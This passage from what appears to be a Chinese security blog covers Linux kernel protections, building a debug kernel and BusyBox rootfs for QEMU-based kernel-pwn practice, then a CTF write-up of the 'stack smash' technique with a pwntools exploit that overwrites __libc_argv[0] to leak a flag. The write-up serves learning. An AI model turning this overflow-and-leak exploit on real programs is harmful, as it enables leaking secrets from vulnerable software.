阻止内核态访问用户态内存的数据（除非显示允许）</li><li>SMEP 阻值内核态直接执行用户态内存中的代码</li></ul><h3 id="KETI"><a href="#KETI" class="headerlink" title="KETI"></a>KETI</h3><p>内核页表隔离 （Kernel page-table isolation） ，内核空间和用户空间分别只用两组不同的页表，这对于内核的内存管理产生了根本性变化</p><p>两张表都有对用户内存空间的完整映射，但在用户页只影射了少量内核代码（如系统调用入口点，中断处理等），只有在内核页表中才有对内核内存空间的完整映射</p><p><img src="/2025/08/07/kernel%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%8F%8A%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1754814044256.png" alt="开启保护前/后的变化"></p><p>主要用来缓解 Meltdown 漏洞</p><p>KPTI 同时令内核页表中属于用户地址空间的部分不再拥有执行权限，是 ret2usr 不再可用</p><h2 id="内核“堆“上保护机制"><a href="#内核“堆“上保护机制" class="headerlink" title="内核“堆“上保护机制"></a>内核“堆“上保护机制</h2><h3 id="Hardened-Usercopy"><a href="#Hardened-Usercopy" class="headerlink" title="Hardened Usercopy"></a>Hardened Usercopy</h3><p>一种用以在用户空间和内核空间之间拷贝数据时进行越界检查的机制，主要检查拷贝过程是否会对内核空间的数据进行越界读写   ：</p><ul><li>读取数据长度是否超过 object 范围</li><li>写入的数据长度是否超过 object 范围</li></ul><p>这种保护用户 copy_to_user() 与 copy_from_user() 等数据交换的 api 中，不过不适用于内核空间内的数据拷贝</p><h3 id="Hardened-freelist"><a href="#Hardened-freelist" class="headerlink" title="Hardened freelist"></a>Hardened freelist</h3><p>类似于 glibc-2.32 加入的保护，开启保护后 free objext 的 next 指针存储的是以下三个值进行异或操作后的值</p><ul><li>当前 free object 地址</li><li>下一个 free object 的地址</li><li>有 kmem_cache 指定的一个 random 值</li></ul><p>所以攻击者至少获取到第一或第三个值才可以篡改 freelist</p><h3 id="Random-freelist"><a href="#Random-freelist" class="headerlink" title="Random freelist"></a>Random freelist</h3><p>发生在 slub allocator（管理小内存的分配和释放）向 buddy system（管理内存页的分配和释放）申请到页框之后的处理过程中，对于未开启的，其上的 object 连接顺序是线性的，但开启后会变成随机的，使攻击者无法预测下一个分配的 objext 地址</p><p>运行时 freelist 的构成仍然遵循 LIFO</p><p><img src="/2025/08/07/kernel%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%8F%8A%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1754818591228.png"></p><h3 id="CONFIG-INIT-ON-ALLOC-DEFAULT-ON"><a href="#CONFIG-INIT-ON-ALLOC-DEFAULT-ON" class="headerlink" title="CONFIG_INIT_ON_ALLOC_DEFAULT_ON"></a>CONFIG_INIT_ON_ALLOC_DEFAULT_ON</h3><p>内核进行堆内存分配时，会对分配的内存上的内容进行清零</p><h1 id="CTF-kernel-pwn-相关"><a href="#CTF-kernel-pwn-相关" class="headerlink" title="CTF kernel pwn 相关"></a>CTF kernel pwn 相关</h1><p>传统 kernel pwn 题目会给以下三个文件</p><ul><li>boot.sh 一个用于启动 kernel 的 shell 脚本，多用 qemu，保护措施与 qemu 不同的启动参数有关</li><li>bzLmage：内核启动映像</li><li>rootfs.cpio：文件系统映像</li></ul><h1 id="源码相关"><a href="#源码相关" class="headerlink" title="源码相关"></a>源码相关</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>官网：<a href="https://www.kernel.org/">https://www.kernel.org/</a></p><p>镜像站：<a href="https://mirrors.tuna.tsinghua.edu.cn/kernel/">https://mirrors.tuna.tsinghua.edu.cn/kernel/</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> https://mirrors.tuna.tsinghua.edu.cn/kernel/v6.x/linux-<span class="hljs-number">6</span>.<span class="hljs-number">12</span>.<span class="hljs-number">16</span>.tar.xz<br><span class="hljs-attribute">unxz</span> ./linux-<span class="hljs-number">6</span>.<span class="hljs-number">12</span>.<span class="hljs-number">16</span>.tar.xz<br></code></pre></td></tr></table></figure><h2 id="验证签名"><a href="#验证签名" class="headerlink" title="验证签名"></a>验证签名</h2><p>为了确认内核是否被恶意篡改</p><p>下载工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update<br><span class="hljs-built_in">sudo</span> apt install gnupg<br></code></pre></td></tr></table></figure><p>导入公钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gpg2 --locate-keys torvalds@kernel.org gregkh@kernel.org<br></code></pre></td></tr></table></figure><p>下载内核签名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://mirrors.tuna.tsinghua.edu.cn/kernel/v6.x/linux-6.12.16.tar.sign<br></code></pre></td></tr></table></figure><p>验证签名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gpg2 --verify linux-6.12.16.tar.sign<br></code></pre></td></tr></table></figure><p>报警告是因为导入的公钥没有可信的签名，无法证明其确实来自  Linus Torvalds 和 Greg Kroah-Hartman ，可以选择用 TOFU 信任签名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gpg2 --tofu-policy good 38DBBDC86092693E<br></code></pre></td></tr></table></figure><p>重新验证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gpg2 --trust-model tofu --verify ./linux-6.12.16.tar.sign <br></code></pre></td></tr></table></figure><p>不再警告</p><p>解压压缩包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar -xf linux-6.12.16.tar<br></code></pre></td></tr></table></figure><h2 id="配置编译选项"><a href="#配置编译选项" class="headerlink" title="配置编译选项"></a>配置编译选项</h2><p>利用图形化界面调整编译选项</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">make menuconfig<br></code></pre></td></tr></table></figure><p>需要以下工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install libncurses-dev pkg-config bison flex<br></code></pre></td></tr></table></figure><p>如果不想要交互式，直接调整 .config 文件或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#默认配置</span><br>make defconfig<br></code></pre></td></tr></table></figure><p>这里我们主要关注调试方面的选项，依次进入到 Kernel hacking -&gt; Compile-time checks and compiler options，然后勾选如下选项 Compile the kernel with debug info ，以便于调试。这通常是默认开启的。</p><p>6.12.16 中我没找到该选项，问了问 AI，Kernel hacking -&gt; Compile-time checks and compiler options-&gt;Debug information 中选择 Generate DWARF Version 4 debuginfo 也可以</p><p>如果要使用 kgdb 调试内核，则需要选中 KGDB: kernel debugger，并选中 KGDB 下的所有选项。linux-5.15.513 中貌似就没有该选项了，据说是默认开启</p><h2 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h2><p>通常我们要获取的是压缩后的内核镜像文件 bzImage，利用如下命令进行编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">make bzIamge<br></code></pre></td></tr></table></figure><p>可以用全部核心来提高编译速度</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">nproc</span> <span class="hljs-comment"># 查看自己主机多少核</span><br></code></pre></td></tr></table></figure><p>用全部</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">make -j$(<span class="hljs-built_in">nproc</span>)<br></code></pre></td></tr></table></figure><p>出现</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Kernel: <span class="hljs-built_in">arch</span>/x86/boot/bzImage is ready  (#1)<br></code></pre></td></tr></table></figure><p>说明编译完成</p><p>关注以下两个文件</p><ul><li>vmlinuz：编译生成的 ELF 格式的原始内核镜像文件，通常位于源码根目录下。</li><li>bzImage：前者进行压缩后的内核镜像文件，通常位于 arch&#x2F;架构&#x2F;boot&#x2F;bzImage （注意对于 x86-64 而言仍是 x86 目录）</li></ul><p>常见内核文件格式</p><ul><li>vmlinux：未压缩的可执行内核映像（ELF），该文件常在生成 vmlinuz 过程中长生，适合调试用，并非 bootable（可启动的）</li><li>vmlinuz：压缩内核镜像（通常 gzip 压缩），bootable，用于实际 linux 系统启动，位于 &#x2F;boot 目录下</li><li>zlmage：较老的压缩镜像内核，适用于小于 512KB 的内核，启动时加载的到内存低地址（0-640KB），可理解为小内核时代的压缩可启动文件</li><li>bzImage：现代内核压缩镜像（big zImage），适用于较大内核（&gt;512KB）启动时加载到高地址（&gt;1MB），gzip 压缩，但开头包含解压代码我，不能用 gunzip，可理解为现代 linux 标准启动镜像，能装大内核</li><li>vmlinux.bin：原始内核的纯二进制文件，去符号表和调试信息，bootable</li></ul><p>生成命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">objcopy -O binary vmlinux vmlinux.bin<br></code></pre></td></tr></table></figure><ul><li>uImage：U-Boot 专用镜像，在 zImage 前加了 0x40 长度的 header tag，包含镜像类型，加载地址，生成时间，大小等，嵌入式设备使用 U-Boot 启动 linux 时会用到</li></ul><h1 id="BusyBox构建文件系统并启动内核"><a href="#BusyBox构建文件系统并启动内核" class="headerlink" title="BusyBox构建文件系统并启动内核"></a>BusyBox构建文件系统并启动内核</h1><p>下载，这里选择 1.36.0 的版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://busybox.net/downloads/busybox-1.36.0.tar.bz2<br></code></pre></td></tr></table></figure><p>解压</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar -jxvf busybox-1.36.0.tar.bz2 <br></code></pre></td></tr></table></figure><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>进入图形化配置界面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">make menuconfig<br></code></pre></td></tr></table></figure><p> 勾选 Settings<code>---&gt;</code>Build static binary file (no shared lib) 以构建不依赖于 libc 的静态编译版本</p><p>进行编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">make -j$(<span class="hljs-built_in">nproc</span>)<br>make install<br></code></pre></td></tr></table></figure><h2 id="配置文件系统"><a href="#配置文件系统" class="headerlink" title="配置文件系统"></a>配置文件系统</h2><p>进入编译后的 _install 文件夹</p><p>创建基本文件结构</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> _install<br><span class="hljs-built_in">mkdir</span> -pv &#123;bin,sbin,etc,proc,sys,dev,home/ctf,root,tmp,lib64,lib/x86_64-linux-gnu,usr/&#123;bin,sbin&#125;&#125;<br><span class="hljs-built_in">touch</span> etc/inittab<br><span class="hljs-built_in">mkdir</span> etc/init.d<br><span class="hljs-built_in">touch</span> etc/init.d/rcS<br><span class="hljs-built_in">chmod</span> +x ./etc/init.d/rcS<br></code></pre></td></tr></table></figure><p>在 .&#x2F;etc&#x2F;inittab 中写入如下内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">::sysinit:/etc/init.d/rcS<br>::askfirst:/bin/login<br>::ctrlaltdel:/sbin/reboot<br>::shutdown:/sbin/swapoff -a<br>::shutdown:/bin/umount -a -r<br>::restart:/sbin/init<br></code></pre></td></tr></table></figure><p>指定初始化脚本为 &#x2F;etc&#x2F;init.d&#x2F;rcS ，接下来在该文件写入如下内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-built_in">chown</span> -R root:root /<br><span class="hljs-built_in">chmod</span> 700 /root<br><span class="hljs-built_in">chown</span> -R ctf:ctf /home/ctf<br><br>mount -t proc none /proc<br>mount -t sysfs none /sys<br>mount -t tmpfs tmpfs /tmp<br><span class="hljs-built_in">mkdir</span> /dev/pts<br>mount -t devpts devpts /dev/pts<br><br><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict<br><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict<br><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\nBoot took <span class="hljs-subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span><br><br><span class="hljs-built_in">cd</span> /home/ctf<br>su ctf -c sh<br><br>poweroff -d 0  -f<br></code></pre></td></tr></table></figure><p>接着添加权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x reS<br></code></pre></td></tr></table></figure><p>接着配置用户组相关权限，这里简历两个用户组 root 和 ctf ，以及两个用户 root 和 ctf ，并配置一条文件系统挂载项</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;root:x:0:0:root:/root:/bin/sh&quot;</span> &gt; etc/passwd<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ctf:x:1000:1000:ctf:/home/ctf:/bin/sh&quot;</span> &gt;&gt; etc/passwd<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;root:x:0:&quot;</span> &gt; etc/group<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ctf:x:1000:&quot;</span> &gt;&gt; etc/group<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;none /dev/pts devpts gid=5,mode=620 0 0&quot;</span> &gt; etc/fstab<br></code></pre></td></tr></table></figure><h2 id="打包文件系统"><a href="#打包文件系统" class="headerlink" title="打包文件系统"></a>打包文件系统</h2><p>这里用 cpio 格式打包</p><p>这里进入 _install 文件夹下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find . | cpio -o --format=newc &gt; ../rootfs.cpio<br></code></pre></td></tr></table></figure><p>可以放在自己喜欢的位置</p><p>解包的指令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cpio -idv &lt; ./rootfs.cpio<br></code></pre></td></tr></table></figure><h2 id="启动内核"><a href="#启动内核" class="headerlink" title="启动内核"></a>启动内核</h2><p>将 bzImage 和 rootfs.cpio 放入同一文件夹下，并创建 start.sh ，启动脚本</p><p>脚本中写入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>qemu-system-x86_64 \<br>    -m 128M \<br>    -kernel ./bzImage \<br>    -initrd  ./rootfs.cpio \<br>    -monitor /dev/null \<br>    -append <span class="hljs-string">&quot;root=/dev/ram rdinit=/sbin/init console=ttyS0 oops=panic panic=1 loglevel=3 quiet kaslr&quot;</span> \<br>    -cpu kvm64,+smep \<br>    -smp cores=2,threads=1 \<br>    -nographic \<br>    -snapshot \<br>    -s<br></code></pre></td></tr></table></figure><ul><li>-m：虚拟机内存大小</li><li>-kernel：内核镜像路径</li><li>-hda：文件系统路径</li><li>-monitor：将监视器重定向到主机设备 &#x2F;dev&#x2F;null ，防止 CTF 中被人通过监视器直接拿到flag</li><li>-append：内核启动参数选项<ul><li>root&#x3D;…：设定根文件系统所在设备</li><li>kaslr：开启内核地址随机化</li><li>rdinit：初始启动进程</li><li>loglevel&#x3D;3&amp;quie：不输出 log</li><li>console：指定中断为 &#x2F;dev&#x2F;ttyS0，这样一启动就能进入终端</li></ul></li><li>-cpu：设置 cpu 选项，这里开启 smep 保护</li><li>-smp：设置对称多处理器配置，这里设置两个核心，每个核心一个线程</li><li>-nographic：不提供图形化界面，此时内核仅有串口输出，输出内容被 qemu 重定向到我们的终端</li><li>-snapshot：使用快照的方式启动</li><li>-s：相当于 -gdb tcp::1234 的简写，后续直接使用 gdb 连接本地端口进行调试</li></ul><h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>方便调试可使用 root 用户启动 shell，修改 rcS</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">su ctf -c sh<br></code></pre></td></tr></table></figure><p>ctf 改为 root</p><p>可关闭随机化，即 kaslr-&gt;nokaslr</p><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p>可通过 &#x2F;proc&#x2F;kallsyms 获取特定内核符号信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/kallsyms | grep prepare_kernel_cred<br></code></pre></td></tr></table></figure><p>可通过 lsmod 查看装载的驱动信息</p><p>可读取 &#x2F;sys&#x2F;module，获取更加详细的内核模块信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /sys/module/a3kmod/sections/.text <br><span class="hljs-built_in">cat</span> /sys/module/a3kmod/sections/.data <br></code></pre></td></tr></table></figure><h3 id="启动调试"><a href="#启动调试" class="headerlink" title="启动调试"></a>启动调试</h3><p>利用 gdb 连接到端口进行调试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdb -q -ex <span class="hljs-string">&quot;target remote localhost:1234&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>花式栈溢出技巧</title>
    <link href="/2025/08/07/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/"/>
    <url>/2025/08/07/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/</url>
    
    <content type="html"><![CDATA[<p>刷题时遇到的一些，记录下来^^</p><h1 id="Stack-smash"><a href="#Stack-smash" class="headerlink" title="Stack smash"></a>Stack smash</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>当开启了 canary 的程序，如果栈上那个特定值被覆盖掉，就会报错并调用  __stack_chk_fail </p><p>该函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) __stack_chk_fail (<span class="hljs-type">void</span>)<br>&#123;<br>  __fortify_fail (<span class="hljs-string">&quot;stack smashing detected&quot;</span>);<br>&#125;<br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) internal_function __fortify_fail (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)<br>&#123;<br>  <span class="hljs-comment">/* The loop is added only to keep gcc happy.  */</span><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    __libc_message (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;*** %s ***: %s terminated\n&quot;</span>,<br>                    msg, __libc_argv[<span class="hljs-number">0</span>] ?: <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到会调用底下那个函数，而底下那个函数会打印 __libc_argv[0] 所指向的内容，恰好该指针又在栈上</p><p>正常情况下是指向文件名的</p><p>如果栈溢出很大，足够将该指针覆盖成指向重要信息的指针（比如说 flag 啥的），就可以打印该信息了</p><p>2.31后就用不了了，因为不会打印这个指针了</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="HNCTF-2022-WEEK3-smash"><a href="#HNCTF-2022-WEEK3-smash" class="headerlink" title="[HNCTF 2022 WEEK3]smash"></a>[HNCTF 2022 WEEK3]smash</h3><h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml">[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/yyyffff/nss/[HNCTF_2022_WEEK3]smash/smash&#x27;</span><br>    <span class="hljs-attr">Arch:</span>       <span class="hljs-string">amd64-64-little</span><br>    <span class="hljs-attr">RELRO:</span>      <span class="hljs-string">Full</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>      <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>         <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>        <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x3ff000)</span><br>    <span class="hljs-attr">SHSTK:</span>      <span class="hljs-string">Enabled</span><br>    <span class="hljs-attr">IBT:</span>        <span class="hljs-string">Enabled</span><br>    <span class="hljs-attr">Stripped:</span>   <span class="hljs-literal">No</span><br></code></pre></td></tr></table></figure><h4 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> fd; <span class="hljs-comment">// [rsp+Ch] [rbp-114h]</span><br>  <span class="hljs-type">char</span> v5[<span class="hljs-number">264</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-110h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+118h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>);<br>  fd = open(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> ( !fd )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Open Err0r.&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  &#125;<br>  read(fd, &amp;buf, <span class="hljs-number">0x100u</span>LL);                     <span class="hljs-comment">// 将 flag 写入到了 buf</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Good Luck.&quot;</span>);<br>  gets(v5); <span class="hljs-comment">//没有限制长度</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>将 __libc_argv[0] 覆盖成 buf 地址即可</p><p>用 gdb 查看 __libc_argv[0] 地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">23</span>:<span class="hljs-number">0118</span>│<span class="hljs-number">-008</span> <span class="hljs-number">0x7fffffffd658</span> ◂— <span class="hljs-number">0x2fc196184ebb6e00</span><br><span class="hljs-number">24</span>:<span class="hljs-number">0120</span>│ rbp <span class="hljs-number">0x7fffffffd660</span> —▸ <span class="hljs-number">0x4012f0</span> (__libc_csu_init) ◂— endbr64 <br><span class="hljs-number">25</span>:<span class="hljs-number">0128</span>│+<span class="hljs-number">008</span> <span class="hljs-number">0x7fffffffd668</span> —▸ <span class="hljs-number">0x7ffff7820840</span> (__libc_start_main+<span class="hljs-number">240</span>) ◂— mov edi, eax<br><span class="hljs-number">26</span>:<span class="hljs-number">0130</span>│+<span class="hljs-number">010</span> <span class="hljs-number">0x7fffffffd670</span> ◂— <span class="hljs-number">1</span><br><span class="hljs-number">27</span>:<span class="hljs-number">0138</span>│+<span class="hljs-number">018</span> <span class="hljs-number">0x7fffffffd678</span> —▸ <span class="hljs-number">0x7fffffffd748</span> —▸ <span class="hljs-number">0x7fffffffdb96</span> ◂— <span class="hljs-string">&#x27;/home/yyyffff/nss/[HNCTF_2022_WEEK3]smash/smash&#x27;</span><br></code></pre></td></tr></table></figure><p>计算需要填充的大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; distance <span class="hljs-number">0x7fffffffd748</span> <span class="hljs-number">0x7fffffffd550</span><br><span class="hljs-number">0x7fffffffd748</span>-&gt;<span class="hljs-number">0x7fffffffd550</span> is <span class="hljs-number">-0x1f8</span> bytes (<span class="hljs-number">-0x3f</span> words)<br></code></pre></td></tr></table></figure><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r=process(<span class="hljs-string">&#x27;./smash&#x27;</span>)<br><span class="hljs-comment">#r=remote(&quot;node5.anna.nssctf.cn&quot;,27529)</span><br>r.recv()<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x1f8</span>+p64(<span class="hljs-number">0x404060</span>)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>效果如下</p><p><img src="/2025/08/07/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/1754566870027.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>栈溢出</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一些题目记录</title>
    <link href="/2025/08/02/%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/"/>
    <url>/2025/08/02/%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/</url>
    
